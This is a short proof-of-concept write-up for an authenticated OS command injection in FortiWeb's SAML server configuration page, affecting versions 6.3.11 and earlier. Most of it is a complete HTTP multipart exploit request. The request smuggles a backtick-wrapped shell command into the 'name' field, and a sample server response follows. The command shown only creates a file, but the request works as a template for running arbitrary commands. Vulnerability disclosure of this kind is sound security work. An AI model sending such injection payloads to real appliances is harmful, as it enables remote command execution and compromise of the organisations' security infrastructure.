# Fortinet-FortiWeb-OS-Command-Injection
An OS command injection vulnerability in FortiWeb's management interface (version 6.3.11 and prior) can allow a remote, authenticated attacker to execute arbitrary commands on the system, via the SAML server configuration page.
# PoC
**Request**
```text
POST /api/v2.0/user/remoteserver.saml HTTP/1.1
Host: [redacted]
Cookie: [redacted]
User-Agent: [redacted]
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://[redacted]/root/user/remote-user/saml-user/
X-Csrftoken: 814940160
Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412
Content-Length: 3068
Origin: https://[redacted]
Dnt: 1
Te: trailers
Connection: close
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="q_type"
1
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="name"
`touch /tmp/vulnerable`
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="entityID"
test
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="service-path"
/saml.sso
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="session-lifetime"
8
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="session-timeout"
30
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="sso-bind"
post
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="sso-bind_val"
1
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="sso-path"
/SAML2/POST
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="slo-bind"
post
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="slo-bind_val"
1
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="slo-path"
/SLO/POST
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="flag"
0
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="enforce-signing"
disable
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="enforce-signing_val"
0
-----------------------------94351131111899571381631694412
Content-Disposition: form-data; name="metafile"; filename="test.xml"
Content-Type: text/xml
<?xml version="1.0"?>
<md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" validUntil="2021-06-12T16:54:31Z" cacheDuration="PT1623948871S" entityID="test">
<md:IDPSSODescriptor WantAuthnRequestsSigned="false" protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
<md:KeyDescriptor use="signing">
<ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:X509Data>
<ds:X509Certificate>test</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</md:KeyDescriptor>
<md:KeyDescriptor use="encryption">
<ds:KeyInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:X509Data>
<ds:X509Certificate>test</ds:X509Certificate>
</ds:X509Data>
</ds:KeyInfo>
</md:KeyDescriptor>
<md:NameIDFormat>urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified</md:NameIDFormat>
<md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect" Location="test"/>
</md:IDPSSODescriptor>
</md:EntityDescriptor>
-----------------------------94351131111899571381631694412--
```

**Response**
``` Text
HTTP/1.1 500 Internal Server Error
Date: Thu, 10 Jun 2021 11:59:45 GMT
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Set-Cookie: [redacted]
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Content-Security-Policy: frame-ancestors 'self'
X-Content-Type-Options: nosniff
Content-Length: 20
Strict-Transport-Security: max-age=63072000
Connection: close
Content-Type: application/json
{"errcode": "-651"}
```

Reference:[researcher of Rapid7 William Vu](https://twitter.com/wvuuuuuuuuuuuuu)
